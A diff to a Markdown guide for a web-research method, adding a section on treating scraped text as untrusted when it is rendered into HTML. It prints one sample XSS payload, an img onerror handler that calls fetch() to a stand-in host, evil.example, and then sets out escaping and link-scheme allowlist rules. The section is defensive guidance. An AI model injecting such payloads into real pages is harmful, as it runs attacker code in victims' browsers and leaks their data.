@@ -89,6 +89,45 @@ An empty `existing_solutions` is allowed but expensive: `landscape_summary`
 then has to say what you searched and why nothing came back. "I found nothing"
 without the search behind it is indistinguishable from not looking.
 
+## Researched text is untrusted input
+
+Both methods do the same dangerous thing: they copy text that strangers on the
+internet wrote into a document you then open. Thread titles, quotes, usernames,
+product names, rules-page excerpts, URLs. **Every one of those fields is
+attacker-authorable**, because anyone can post a thread, and this method goes
+looking for threads.
+
+That is fine in a chat reply and fine in Markdown. It is not fine in the HTML
+output, where the browser will run what it's handed. A thread titled
+
+```
+<img src=x onerror="fetch('https://evil.example/'+document.title)">
+```
+
+is a perfectly ordinary thing for someone to post, and dropping it into a
+generated page means opening your own research report executes their code.
+
+So, whenever you render researched content as HTML:
+
+- **Escape every externally sourced field** as HTML entities before it goes
+  into the document: `&` to `&amp;`, `<` to `&lt;`, `>` to `&gt;`, `"` to
+  `&quot;`, `'` to `&#39;`. Titles, quotes, names, `does` lines, gaps,
+  engagement strings, rules quotes, and anything else you read off a page.
+- **Allowlist link schemes.** An `href` or `src` may only be `http:` or
+  `https:`. Drop anything else, `javascript:` and `data:` included, and strip
+  control characters and spaces before you check the scheme, since a browser
+  ignores them inside one and `java&#9;script:` parses as `javascript:`.
+- **Never inline a researched string into a `<script>` block or an inline
+  event handler.** Not escaped, not encoded, not "just this once."
+
+The escaping is yours to do because you are the one writing the file. Nothing
+downstream will do it for you.
+
+The same reasoning is why the example site routes every signal URL through
+`site/src/utils/safeUrl.js` before using it as an `href`. That covers the site.
+It cannot cover a standalone file you generated in a chat, which is why the rule
+lives here too.
+
 ## The same line, pointed the other way
 
 This rubric is shared with [`CHANNELS.md`](./CHANNELS.md), the audience and
